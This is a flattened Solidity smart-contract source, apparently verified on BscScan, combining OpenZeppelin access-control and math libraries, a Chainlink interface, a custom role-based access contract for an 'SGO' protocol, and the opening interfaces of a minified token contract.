/**
 *Submitted for verification at BscScan.com on 2023-06-02
*/

// Sources flattened with hardhat v2.13.1 https://hardhat.org

// File @openzeppelin/contracts/access/IAccessControl.sol@v4.8.3

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts v4.4.1 (access/IAccessControl.sol)

pragma solidity ^0.8.0;

/**
 * @dev External interface of AccessControl declared to support ERC165 detection.
 */
interface IAccessControl {
    /**
     * @dev Emitted when `newAdminRole` is set as ``role``'s admin role, replacing `previousAdminRole`
     *
     * `DEFAULT_ADMIN_ROLE` is the starting admin for all roles, despite
     * {RoleAdminChanged} not being emitted signaling this.
     *
     * _Available since v3.1._
     */
    event RoleAdminChanged(bytes32 indexed role, bytes32 indexed previousAdminRole, bytes32 indexed newAdminRole);

    /**
     * @dev Emitted when `account` is granted `role`.
     *
     * `sender` is the account that originated the contract call, an admin role
     * bearer except when using {AccessControl-_setupRole}.
     */
    event RoleGranted(bytes32 indexed role, address indexed account, address indexed sender);

    /**
     * @dev Emitted when `account` is revoked `role`.
     *
     * `sender` is the account that originated the contract call:
     *   - if using `revokeRole`, it is the admin role bearer
     *   - if using `renounceRole`, it is the role bearer (i.e. `account`)
     */
    event RoleRevoked(bytes32 indexed role, address indexed account, address indexed sender);

    /**
     * @dev Returns `true` if `account` has been granted `role`.
     */
    function hasRole(bytes32 role, address account) external view returns (bool);

    /**
     * @dev Returns the admin role that controls `role`. See {grantRole} and
     * {revokeRole}.
     *
     * To change a role's admin, use {AccessControl-_setRoleAdmin}.
     */
    function getRoleAdmin(bytes32 role) external view returns (bytes32);

    /**
     * @dev Grants `role` to `account`.
     *
     * If `account` had not been already granted `role`, emits a {RoleGranted}
     * event.
     *
     * Requirements:
     *
     * - the caller must have ``role``'s admin role.
     */
    function grantRole(bytes32 role, address account) external;

    /**
     * @dev Revokes `role` from `account`.
     *
     * If `account` had been granted `role`, emits a {RoleRevoked} event.
     *
     * Requirements:
     *
     * - the caller must have ``role``'s admin role.
     */
    function revokeRole(bytes32 role, address account) external;

    /**
     * @dev Revokes `role` from the calling account.
     *
     * Roles are often managed via {grantRole} and {revokeRole}: this function's
     * purpose is to provide a mechanism for accounts to lose their privileges
     * if they are compromised (such as when a trusted device is misplaced).
     *
     * If the calling account had been granted `role`, emits a {RoleRevoked}
     * event.
     *
     * Requirements:
     *
     * - the caller must be `account`.
     */
    function renounceRole(bytes32 role, address account) external;
}


// File @openzeppelin/contracts/utils/Context.sol@v4.8.3


// OpenZeppelin Contracts v4.4.1 (utils/Context.sol)

pragma solidity ^0.8.0;

/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}


// File @openzeppelin/contracts/utils/introspection/IERC165.sol@v4.8.3


// OpenZeppelin Contracts v4.4.1 (utils/introspection/IERC165.sol)

pragma solidity ^0.8.0;

/**
 * @dev Interface of the ERC165 standard, as defined in the
 * https://eips.ethereum.org/EIPS/eip-165[EIP].
 *
 * Implementers can declare support of contract interfaces, which can then be
 * queried by others ({ERC165Checker}).
 *
 * For an implementation, see {ERC165}.
 */
interface IERC165 {
    /**
     * @dev Returns true if this contract implements the interface defined by
     * `interfaceId`. See the corresponding
     * https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified[EIP section]
     * to learn more about how these ids are created.
     *
     * This function call must use less than 30 000 gas.
     */
    function supportsInterface(bytes4 interfaceId) external view returns (bool);
}


// File @openzeppelin/contracts/utils/introspection/ERC165.sol@v4.8.3


// OpenZeppelin Contracts v4.4.1 (utils/introspection/ERC165.sol)

pragma solidity ^0.8.0;

/**
 * @dev Implementation of the {IERC165} interface.
 *
 * Contracts that want to implement ERC165 should inherit from this contract and override {supportsInterface} to check
 * for the additional interface id that will be supported. For example:
 *
 * ```solidity
 * function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
 *     return interfaceId == type(MyInterface).interfaceId || super.supportsInterface(interfaceId);
 * }
 * ```
 *
 * Alternatively, {ERC165Storage} provides an easier to use but more expensive implementation.
 */
abstract contract ERC165 is IERC165 {
    /**
     * @dev See {IERC165-supportsInterface}.
     */
    function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
        return interfaceId == type(IERC165).interfaceId;
    }
}


// File @openzeppelin/contracts/utils/math/Math.sol@v4.8.3


// OpenZeppelin Contracts (last updated v4.8.0) (utils/math/Math.sol)

pragma solidity ^0.8.0;

/**
 * @dev Standard math utilities missing in the Solidity language.
 */
library Math {
    enum Rounding {
        Down, // Toward negative infinity
        Up, // Toward infinity
        Zero // Toward zero
    }

    /**
     * @dev Returns the largest of two numbers.
     */
    function max(uint256 a, uint256 b) internal pure returns (uint256) {
        return a > b ? a : b;
    }

    /**
     * @dev Returns the smallest of two numbers.
     */
    function min(uint256 a, uint256 b) internal pure returns (uint256) {
        return a < b ? a : b;
    }

    /**
     * @dev Returns the average of two numbers. The result is rounded towards
     * zero.
     */
    function average(uint256 a, uint256 b) internal pure returns (uint256) {
        // (a + b) / 2 can overflow.
        return (a & b) + (a ^ b) / 2;
    }

    /**
     * @dev Returns the ceiling of the division of two numbers.
     *
     * This differs from standard division with `/` in that it rounds up instead
     * of rounding down.
     */
    function ceilDiv(uint256 a, uint256 b) internal pure returns (uint256) {
        // (a + b - 1) / b can overflow on addition, so we distribute.
        return a == 0 ? 0 : (a - 1) / b + 1;
    }

    /**
     * @notice Calculates floor(x * y / denominator) with full precision. Throws if result overflows a uint256 or denominator == 0
     * @dev Original credit to Remco Bloemen under MIT license (https://xn--2-umb.com/21/muldiv)
     * with further edits by Uniswap Labs also under MIT license.
     */
    function mulDiv(
        uint256 x,
        uint256 y,
        uint256 denominator
    ) internal pure returns (uint256 result) {
        unchecked {
            // 512-bit multiply [prod1 prod0] = x * y. Compute the product mod 2^256 and mod 2^256 - 1, then use
            // use the Chinese Remainder Theorem to reconstruct the 512 bit result. The result is stored in two 256
            // variables such that product = prod1 * 2^256 + prod0.
            uint256 prod0; // Least significant 256 bits of the product
            uint256 prod1; // Most significant 256 bits of the product
            assembly {
                let mm := mulmod(x, y, not(0))
                prod0 := mul(x, y)
                prod1 := sub(sub(mm, prod0), lt(mm, prod0))
            }

            // Handle non-overflow cases, 256 by 256 division.
            if (prod1 == 0) {
                return prod0 / denominator;
            }

            // Make sure the result is less than 2^256. Also prevents denominator == 0.
            require(denominator > prod1);

            ///////////////////////////////////////////////
            // 512 by 256 division.
            ///////////////////////////////////////////////

            // Make division exact by subtracting the remainder from [prod1 prod0].
            uint256 remainder;
            assembly {
                // Compute remainder using mulmod.
                remainder := mulmod(x, y, denominator)

                // Subtract 256 bit number from 512 bit number.
                prod1 := sub(prod1, gt(remainder, prod0))
                prod0 := sub(prod0, remainder)
            }

            // Factor powers of two out of denominator and compute largest power of two divisor of denominator. Always >= 1.
            // See https://cs.stackexchange.com/q/138556/92363.

            // Does not overflow because the denominator cannot be zero at this stage in the function.
            uint256 twos = denominator & (~denominator + 1);
            assembly {
                // Divide denominator by twos.
                denominator := div(denominator, twos)

                // Divide [prod1 prod0] by twos.
                prod0 := div(prod0, twos)

                // Flip twos such that it is 2^256 / twos. If twos is zero, then it becomes one.
                twos := add(div(sub(0, twos), twos), 1)
            }

            // Shift in bits from prod1 into prod0.
            prod0 |= prod1 * twos;

            // Invert denominator mod 2^256. Now that denominator is an odd number, it has an inverse modulo 2^256 such
            // that denominator * inv = 1 mod 2^256. Compute the inverse by starting with a seed that is correct for
            // four bits. That is, denominator * inv = 1 mod 2^4.
            uint256 inverse = (3 * denominator) ^ 2;

            // Use the Newton-Raphson iteration to improve the precision. Thanks to Hensel's lifting lemma, this also works
            // in modular arithmetic, doubling the correct bits in each step.
            inverse *= 2 - denominator * inverse; // inverse mod 2^8
            inverse *= 2 - denominator * inverse; // inverse mod 2^16
            inverse *= 2 - denominator * inverse; // inverse mod 2^32
            inverse *= 2 - denominator * inverse; // inverse mod 2^64
            inverse *= 2 - denominator * inverse; // inverse mod 2^128
            inverse *= 2 - denominator * inverse; // inverse mod 2^256

            // Because the division is now exact we can divide by multiplying with the modular inverse of denominator.
            // This will give us the correct result modulo 2^256. Since the preconditions guarantee that the outcome is
            // less than 2^256, this is the final result. We don't need to compute the high bits of the result and prod1
            // is no longer required.
            result = prod0 * inverse;
            return result;
        }
    }

    /**
     * @notice Calculates x * y / denominator with full precision, following the selected rounding direction.
     */
    function mulDiv(
        uint256 x,
        uint256 y,
        uint256 denominator,
        Rounding rounding
    ) internal pure returns (uint256) {
        uint256 result = mulDiv(x, y, denominator);
        if (rounding == Rounding.Up && mulmod(x, y, denominator) > 0) {
            result += 1;
        }
        return result;
    }

    /**
     * @dev Returns the square root of a number. If the number is not a perfect square, the value is rounded down.
     *
     * Inspired by Henry S. Warren, Jr.'s "Hacker's Delight" (Chapter 11).
     */
    function sqrt(uint256 a) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        // For our first guess, we get the biggest power of 2 which is smaller than the square root of the target.
        //
        // We know that the "msb" (most significant bit) of our target number `a` is a power of 2 such that we have
        // `msb(a) <= a < 2*msb(a)`. This value can be written `msb(a)=2**k` with `k=log2(a)`.
        //
        // This can be rewritten `2**log2(a) <= a < 2**(log2(a) + 1)`
        // → `sqrt(2**k) <= sqrt(a) < sqrt(2**(k+1))`
        // → `2**(k/2) <= sqrt(a) < 2**((k+1)/2) <= 2**(k/2 + 1)`
        //
        // Consequently, `2**(log2(a) / 2)` is a good first approximation of `sqrt(a)` with at least 1 correct bit.
        uint256 result = 1 << (log2(a) >> 1);

        // At this point `result` is an estimation with one bit of precision. We know the true value is a uint128,
        // since it is the square root of a uint256. Newton's method converges quadratically (precision doubles at
        // every iteration). We thus need at most 7 iteration to turn our partial result with one bit of precision
        // into the expected uint128 result.
        unchecked {
            result = (result + a / result) >> 1;
            result = (result + a / result) >> 1;
            result = (result + a / result) >> 1;
            result = (result + a / result) >> 1;
            result = (result + a / result) >> 1;
            result = (result + a / result) >> 1;
            result = (result + a / result) >> 1;
            return min(result, a / result);
        }
    }

    /**
     * @notice Calculates sqrt(a), following the selected rounding direction.
     */
    function sqrt(uint256 a, Rounding rounding) internal pure returns (uint256) {
        unchecked {
            uint256 result = sqrt(a);
            return result + (rounding == Rounding.Up && result * result < a ? 1 : 0);
        }
    }

    /**
     * @dev Return the log in base 2, rounded down, of a positive value.
     * Returns 0 if given 0.
     */
    function log2(uint256 value) internal pure returns (uint256) {
        uint256 result = 0;
        unchecked {
            if (value >> 128 > 0) {
                value >>= 128;
                result += 128;
            }
            if (value >> 64 > 0) {
                value >>= 64;
                result += 64;
            }
            if (value >> 32 > 0) {
                value >>= 32;
                result += 32;
            }
            if (value >> 16 > 0) {
                value >>= 16;
                result += 16;
            }
            if (value >> 8 > 0) {
                value >>= 8;
                result += 8;
            }
            if (value >> 4 > 0) {
                value >>= 4;
                result += 4;
            }
            if (value >> 2 > 0) {
                value >>= 2;
                result += 2;
            }
            if (value >> 1 > 0) {
                result += 1;
            }
        }
        return result;
    }

    /**
     * @dev Return the log in base 2, following the selected rounding direction, of a positive value.
     * Returns 0 if given 0.
     */
    function log2(uint256 value, Rounding rounding) internal pure returns (uint256) {
        unchecked {
            uint256 result = log2(value);
            return result + (rounding == Rounding.Up && 1 << result < value ? 1 : 0);
        }
    }

    /**
     * @dev Return the log in base 10, rounded down, of a positive value.
     * Returns 0 if given 0.
     */
    function log10(uint256 value) internal pure returns (uint256) {
        uint256 result = 0;
        unchecked {
            if (value >= 10**64) {
                value /= 10**64;
                result += 64;
            }
            if (value >= 10**32) {
                value /= 10**32;
                result += 32;
            }
            if (value >= 10**16) {
                value /= 10**16;
                result += 16;
            }
            if (value >= 10**8) {
                value /= 10**8;
                result += 8;
            }
            if (value >= 10**4) {
                value /= 10**4;
                result += 4;
            }
            if (value >= 10**2) {
                value /= 10**2;
                result += 2;
            }
            if (value >= 10**1) {
                result += 1;
            }
        }
        return result;
    }

    /**
     * @dev Return the log in base 10, following the selected rounding direction, of a positive value.
     * Returns 0 if given 0.
     */
    function log10(uint256 value, Rounding rounding) internal pure returns (uint256) {
        unchecked {
            uint256 result = log10(value);
            return result + (rounding == Rounding.Up && 10**result < value ? 1 : 0);
        }
    }

    /**
     * @dev Return the log in base 256, rounded down, of a positive value.
     * Returns 0 if given 0.
     *
     * Adding one to the result gives the number of pairs of hex symbols needed to represent `value` as a hex string.
     */
    function log256(uint256 value) internal pure returns (uint256) {
        uint256 result = 0;
        unchecked {
            if (value >> 128 > 0) {
                value >>= 128;
                result += 16;
            }
            if (value >> 64 > 0) {
                value >>= 64;
                result += 8;
            }
            if (value >> 32 > 0) {
                value >>= 32;
                result += 4;
            }
            if (value >> 16 > 0) {
                value >>= 16;
                result += 2;
            }
            if (value >> 8 > 0) {
                result += 1;
            }
        }
        return result;
    }

    /**
     * @dev Return the log in base 10, following the selected rounding direction, of a positive value.
     * Returns 0 if given 0.
     */
    function log256(uint256 value, Rounding rounding) internal pure returns (uint256) {
        unchecked {
            uint256 result = log256(value);
            return result + (rounding == Rounding.Up && 1 << (result * 8) < value ? 1 : 0);
        }
    }
}


// File @openzeppelin/contracts/utils/Strings.sol@v4.8.3


// OpenZeppelin Contracts (last updated v4.8.0) (utils/Strings.sol)

pragma solidity ^0.8.0;

/**
 * @dev String operations.
 */
library Strings {
    bytes16 private constant _SYMBOLS = "0123456789abcdef";
    uint8 private constant _ADDRESS_LENGTH = 20;

    /**
     * @dev Converts a `uint256` to its ASCII `string` decimal representation.
     */
    function toString(uint256 value) internal pure returns (string memory) {
        unchecked {
            uint256 length = Math.log10(value) + 1;
            string memory buffer = new string(length);
            uint256 ptr;
            /// @solidity memory-safe-assembly
            assembly {
                ptr := add(buffer, add(32, length))
            }
            while (true) {
                ptr--;
                /// @solidity memory-safe-assembly
                assembly {
                    mstore8(ptr, byte(mod(value, 10), _SYMBOLS))
                }
                value /= 10;
                if (value == 0) break;
            }
            return buffer;
        }
    }

    /**
     * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation.
     */
    function toHexString(uint256 value) internal pure returns (string memory) {
        unchecked {
            return toHexString(value, Math.log256(value) + 1);
        }
    }

    /**
     * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation with fixed length.
     */
    function toHexString(uint256 value, uint256 length) internal pure returns (string memory) {
        bytes memory buffer = new bytes(2 * length + 2);
        buffer[0] = "0";
        buffer[1] = "x";
        for (uint256 i = 2 * length + 1; i > 1; --i) {
            buffer[i] = _SYMBOLS[value & 0xf];
            value >>= 4;
        }
        require(value == 0, "Strings: hex length insufficient");
        return string(buffer);
    }

    /**
     * @dev Converts an `address` with fixed length of 20 bytes to its not checksummed ASCII `string` hexadecimal representation.
     */
    function toHexString(address addr) internal pure returns (string memory) {
        return toHexString(uint256(uint160(addr)), _ADDRESS_LENGTH);
    }
}


// File @openzeppelin/contracts/access/AccessControl.sol@v4.8.3


// OpenZeppelin Contracts (last updated v4.8.0) (access/AccessControl.sol)

pragma solidity ^0.8.0;




/**
 * @dev Contract module that allows children to implement role-based access
 * control mechanisms. This is a lightweight version that doesn't allow enumerating role
 * members except through off-chain means by accessing the contract event logs. Some
 * applications may benefit from on-chain enumerability, for those cases see
 * {AccessControlEnumerable}.
 *
 * Roles are referred to by their `bytes32` identifier. These should be exposed
 * in the external API and be unique. The best way to achieve this is by
 * using `public constant` hash digests:
 *
 * ```
 * bytes32 public constant MY_ROLE = keccak256("MY_ROLE");
 * ```
 *
 * Roles can be used to represent a set of permissions. To restrict access to a
 * function call, use {hasRole}:
 *
 * ```
 * function foo() public {
 *     require(hasRole(MY_ROLE, msg.sender));
 *     ...
 * }
 * ```
 *
 * Roles can be granted and revoked dynamically via the {grantRole} and
 * {revokeRole} functions. Each role has an associated admin role, and only
 * accounts that have a role's admin role can call {grantRole} and {revokeRole}.
 *
 * By default, the admin role for all roles is `DEFAULT_ADMIN_ROLE`, which means
 * that only accounts with this role will be able to grant or revoke other
 * roles. More complex role relationships can be created by using
 * {_setRoleAdmin}.
 *
 * WARNING: The `DEFAULT_ADMIN_ROLE` is also its own admin: it has permission to
 * grant and revoke this role. Extra precautions should be taken to secure
 * accounts that have been granted it.
 */
abstract contract AccessControl is Context, IAccessControl, ERC165 {
    struct RoleData {
        mapping(address => bool) members;
        bytes32 adminRole;
    }

    mapping(bytes32 => RoleData) private _roles;

    bytes32 public constant DEFAULT_ADMIN_ROLE = 0x00;

    /**
     * @dev Modifier that checks that an account has a specific role. Reverts
     * with a standardized message including the required role.
     *
     * The format of the revert reason is given by the following regular expression:
     *
     *  /^AccessControl: account (0x[0-9a-f]{40}) is missing role (0x[0-9a-f]{64})$/
     *
     * _Available since v4.1._
     */
    modifier onlyRole(bytes32 role) {
        _checkRole(role);
        _;
    }

    /**
     * @dev See {IERC165-supportsInterface}.
     */
    function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
        return interfaceId == type(IAccessControl).interfaceId || super.supportsInterface(interfaceId);
    }

    /**
     * @dev Returns `true` if `account` has been granted `role`.
     */
    function hasRole(bytes32 role, address account) public view virtual override returns (bool) {
        return _roles[role].members[account];
    }

    /**
     * @dev Revert with a standard message if `_msgSender()` is missing `role`.
     * Overriding this function changes the behavior of the {onlyRole} modifier.
     *
     * Format of the revert message is described in {_checkRole}.
     *
     * _Available since v4.6._
     */
    function _checkRole(bytes32 role) internal view virtual {
        _checkRole(role, _msgSender());
    }

    /**
     * @dev Revert with a standard message if `account` is missing `role`.
     *
     * The format of the revert reason is given by the following regular expression:
     *
     *  /^AccessControl: account (0x[0-9a-f]{40}) is missing role (0x[0-9a-f]{64})$/
     */
    function _checkRole(bytes32 role, address account) internal view virtual {
        if (!hasRole(role, account)) {
            revert(
                string(
                    abi.encodePacked(
                        "AccessControl: account ",
                        Strings.toHexString(account),
                        " is missing role ",
                        Strings.toHexString(uint256(role), 32)
                    )
                )
            );
        }
    }

    /**
     * @dev Returns the admin role that controls `role`. See {grantRole} and
     * {revokeRole}.
     *
     * To change a role's admin, use {_setRoleAdmin}.
     */
    function getRoleAdmin(bytes32 role) public view virtual override returns (bytes32) {
        return _roles[role].adminRole;
    }

    /**
     * @dev Grants `role` to `account`.
     *
     * If `account` had not been already granted `role`, emits a {RoleGranted}
     * event.
     *
     * Requirements:
     *
     * - the caller must have ``role``'s admin role.
     *
     * May emit a {RoleGranted} event.
     */
    function grantRole(bytes32 role, address account) public virtual override onlyRole(getRoleAdmin(role)) {
        _grantRole(role, account);
    }

    /**
     * @dev Revokes `role` from `account`.
     *
     * If `account` had been granted `role`, emits a {RoleRevoked} event.
     *
     * Requirements:
     *
     * - the caller must have ``role``'s admin role.
     *
     * May emit a {RoleRevoked} event.
     */
    function revokeRole(bytes32 role, address account) public virtual override onlyRole(getRoleAdmin(role)) {
        _revokeRole(role, account);
    }

    /**
     * @dev Revokes `role` from the calling account.
     *
     * Roles are often managed via {grantRole} and {revokeRole}: this function's
     * purpose is to provide a mechanism for accounts to lose their privileges
     * if they are compromised (such as when a trusted device is misplaced).
     *
     * If the calling account had been revoked `role`, emits a {RoleRevoked}
     * event.
     *
     * Requirements:
     *
     * - the caller must be `account`.
     *
     * May emit a {RoleRevoked} event.
     */
    function renounceRole(bytes32 role, address account) public virtual override {
        require(account == _msgSender(), "AccessControl: can only renounce roles for self");

        _revokeRole(role, account);
    }

    /**
     * @dev Grants `role` to `account`.
     *
     * If `account` had not been already granted `role`, emits a {RoleGranted}
     * event. Note that unlike {grantRole}, this function doesn't perform any
     * checks on the calling account.
     *
     * May emit a {RoleGranted} event.
     *
     * [WARNING]
     * ====
     * This function should only be called from the constructor when setting
     * up the initial roles for the system.
     *
     * Using this function in any other way is effectively circumventing the admin
     * system imposed by {AccessControl}.
     * ====
     *
     * NOTE: This function is deprecated in favor of {_grantRole}.
     */
    function _setupRole(bytes32 role, address account) internal virtual {
        _grantRole(role, account);
    }

    /**
     * @dev Sets `adminRole` as ``role``'s admin role.
     *
     * Emits a {RoleAdminChanged} event.
     */
    function _setRoleAdmin(bytes32 role, bytes32 adminRole) internal virtual {
        bytes32 previousAdminRole = getRoleAdmin(role);
        _roles[role].adminRole = adminRole;
        emit RoleAdminChanged(role, previousAdminRole, adminRole);
    }

    /**
     * @dev Grants `role` to `account`.
     *
     * Internal function without access restriction.
     *
     * May emit a {RoleGranted} event.
     */
    function _grantRole(bytes32 role, address account) internal virtual {
        if (!hasRole(role, account)) {
            _roles[role].members[account] = true;
            emit RoleGranted(role, account, _msgSender());
        }
    }

    /**
     * @dev Revokes `role` from `account`.
     *
     * Internal function without access restriction.
     *
     * May emit a {RoleRevoked} event.
     */
    function _revokeRole(bytes32 role, address account) internal virtual {
        if (hasRole(role, account)) {
            _roles[role].members[account] = false;
            emit RoleRevoked(role, account, _msgSender());
        }
    }
}


// File @chainlink/contracts/src/v0.8/interfaces/AggregatorV3Interface.sol@v0.6.1


pragma solidity ^0.8.0;

interface AggregatorV3Interface {
  function decimals() external view returns (uint8);

  function description() external view returns (string memory);

  function version() external view returns (uint256);

  function getRoundData(uint80 _roundId)
    external
    view
    returns (
      uint80 roundId,
      int256 answer,
      uint256 startedAt,
      uint256 updatedAt,
      uint80 answeredInRound
    );

  function latestRoundData()
    external
    view
    returns (
      uint80 roundId,
      int256 answer,
      uint256 startedAt,
      uint256 updatedAt,
      uint80 answeredInRound
    );
}


// File contracts/RBAC.sol


//
// RBAC for use with SGO PROTOCOL COPYRIGHT (C) 2023
pragma solidity ^0.8.17;

contract RBAC is AccessControl {
  bytes32 public constant AI_ROLE = keccak256("AI");
  bytes32 public constant AGENT_ROLE = keccak256("AGENT");
  bytes32 public constant ANALYST_ROLE = keccak256("ANALYST");
  bytes32 public constant PAIRPARTNER_ROLE = keccak256("PAIRPARTNER");
  bytes32 public constant COMMUNITY_ROLE = keccak256("COMMUNITY");

  constructor (address root) {
    // NOTE: Other DEFAULT_ADMIN's can remove other admins, give this role with great care
    _setupRole(DEFAULT_ADMIN_ROLE, root); // The creator of the contract is the default admin

    // SETUP role Hierarchy:
    // DEFAULT_ADMIN_ROLE > AGENT > AI_ROLE > ANALYST_ROLE > PAIRPARTNER > COMMUNITY_ROLE > no role
    _setRoleAdmin(AGENT_ROLE, DEFAULT_ADMIN_ROLE);
    _setRoleAdmin(AI_ROLE, AGENT_ROLE);
    _setRoleAdmin(ANALYST_ROLE, AI_ROLE);
    _setRoleAdmin(PAIRPARTNER_ROLE, ANALYST_ROLE);
    _setRoleAdmin(COMMUNITY_ROLE, PAIRPARTNER_ROLE);
  }

  // Create a bool check to see if a account address has the role admin
  function isAdmin(address account) public virtual view returns(bool)
  {
    return hasRole(DEFAULT_ADMIN_ROLE, account);
  }


  function isAI(address account) public virtual view returns(bool)
  {
    return hasRole(AI_ROLE, account);
  }

  function isAgent(address account) public virtual view returns(bool)
  {
    return hasRole(AGENT_ROLE, account);
  }

  
  function isAnalyst(address account) public virtual view returns(bool)
  {
    return hasRole(ANALYST_ROLE, account);
  }


  function isPairPartner(address account) public virtual view returns(bool)
  {
    return hasRole(PAIRPARTNER_ROLE, account);
  }


  function isCommunity(address account) public virtual view returns(bool)
  {
    return hasRole(COMMUNITY_ROLE, account);
  }

  // Create a modifier that can be used in other contract to make a pre-check
  // That makes sure that the sender of the transaction (msg.sender)  is a admin
  modifier onlyAdmin() {
    require(isAdmin(msg.sender), "Admin");
      _;
  }

  modifier onlyAgent() {
    require(isAgent(msg.sender), "Agent");
      _;
  }

  modifier onlyAI() {
    require(isAI(msg.sender), "AI");
      _;
  }


  modifier onlyAnalyst() {
    require(isAnalyst(msg.sender), "Analyst");
      _;
  }

  modifier onlyPairPartner() {
    require(isPairPartner(msg.sender), "Partner");
      _;
  }


  modifier onlyCommunity() {
    require(isCommunity(msg.sender), "Community");
      _;
  }

  // Add a user address as a admin
  function addAdmin(address account) public virtual onlyAdmin
  {
    grantRole(DEFAULT_ADMIN_ROLE, account);
  }

  function addAgent(address account) external virtual onlyAdmin
  {
    grantRole(AGENT_ROLE, account);
  }


  function addAI(address account) external virtual onlyAdmin
  {
    grantRole(AI_ROLE, account);
  }


  function addAnalyst(address account) external virtual onlyAdmin
  {
    grantRole(ANALYST_ROLE, account);
  }


  function addPairPartner(address account) external virtual onlyAdmin
  {
    grantRole(PAIRPARTNER_ROLE, account);
  }


  function addCommunity(address account) external virtual onlyAdmin
  {
    grantRole(COMMUNITY_ROLE, account);
  }

  // Hand over contract - clean - no strings
  function renounceAdmin(address account) public virtual onlyAdmin
  {
    //revokeRole(AI_ROLE, account);
    renounceRole(DEFAULT_ADMIN_ROLE, account);
  }
}


// File contracts/Enigma/SafuuGO.sol


// SGO PROTOCOL COPYRIGHT (C) 2023
// x86171d7aa39d175a1999233e2c03271c31f96aca0ae50e09a4656d75
pragma solidity 0.8.17;interface IERC20 {function totalSupply() external view returns (uint256);function balanceOf(address who) external view returns (uint256);function allowance(address owner, address spender)external view returns (uint256);function transfer(address to, uint256 value) external returns (bool);function approve(address spender, uint256 value) external returns (bool);function transferFrom(address from,address to,uint256 value) external returns (bool);event Transfer(address indexed from, address indexed to, uint256 value);event Approval(address indexed owner,address indexed spender,uint256 value);}interface IPancakeSwapPair {event Approval(address indexed owner, address indexed spender, uint value);event Transfer(address indexed from, address indexed to, uint value);function name() external pure returns (string memory);function symbol() external pure returns (string memory);function decimals() external pure returns (uint8);function totalSupply() external view returns (uint);function balanceOf(address owner) external view returns (uint);function allowance(address owner, address spender) external view returns (uint);function approve(address spender, uint value) external returns (bool);function transfer(address to, uint value) external returns (bool);function transferFrom(address from, address to, uint value) external returns (bool);function DOMAIN_SEPARATOR() external view returns (bytes32);function PERMIT_TYPEHASH() external pure returns (bytes32);function nonces(address owner) external view returns (uint);function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;event Mint(address indexed sender, uint amount0, uint amount1);event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);event Swap(address indexed sender,uint amount0In,uint amount1In,uint amount0Out,uint amount1Out,address indexed to);event Sync(uint112 reserve0, uint112 reserve1);function MINIMUM_LIQUIDITY() external pure returns (uint);function factory() external view returns (address);function token0() external view returns (address);function token1() external view returns (address);function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);function price0CumulativeLast() external view returns (uint);function price1CumulativeLast() external view returns (uint);function kLast() external view returns (uint);function mint(address to) external returns (uint liquidity);function burn(address to) external returns (uint amount0, uint amount1);function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;function skim(address to) external;function sync() external;function initialize(address, address) external;}interface IPancakeSwapRouter{function factory() external pure returns (address);function WETH() external pure returns (address);function swapExactTokensForTokens(uint amountIn,uint amountOutMin,address[] calldata path,address to,uint deadline) external returns (uint[] memory amounts);function swapTokensForExactTokens(uint amountOut,uint amountInMax,address[] calldata path,address to,uint deadline) external returns (uint[] memory amounts);function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)external payable returns (uint[] memory amounts);function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)external returns (uint[] memory amounts);function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)external returns (uint[] memory amounts);function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)external payable returns (uint[] memory amounts);function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);function swapExactTokensForTokensSupportingFeeOnTransferTokens(uint amountIn,uint amountOutMin,address[] calldata path,address to,uint deadline) external;function swapExactETHForTokensSupportingFeeOnTransferTokens(uint amountOutMin,address[] calldata path,address to,uint deadline) external payable;function swapExactTokensForETHSupportingFeeOnTransferTokens(uint amountIn,uint amountOutMin,address[] calldata path,address to,uint deadline) external;}interface IPancakeSwapFactory {event PairCreated(address indexed token0, address indexed token1, address pair, uint);function feeTo() external view returns (address);function feeToSetter() external view returns (address);function getPair(address tokenA, address tokenB) external view returns (address pair);function allPairs(uint) external view returns (address pair);function allPairsLength() external view returns (uint);function createPair(address tokenA, address tokenB) external returns (address pair);function setFeeTo(address) external;function setFeeToSetter(address) external;}abstract contract ERC20Detailed is IERC20 {string private _name;string private _symbol;uint8 private _decimals;
constructor(string memory name_,string memory symbol_,uint8 decimals_) {_name = name_;_symbol = symbol_;_decimals = decimals_;}function name() public view returns (string memory) {return _name;}function symbol() public view returns (string memory) {return _symbol;}function decimals() public view returns (uint8) {return _decimals;}}
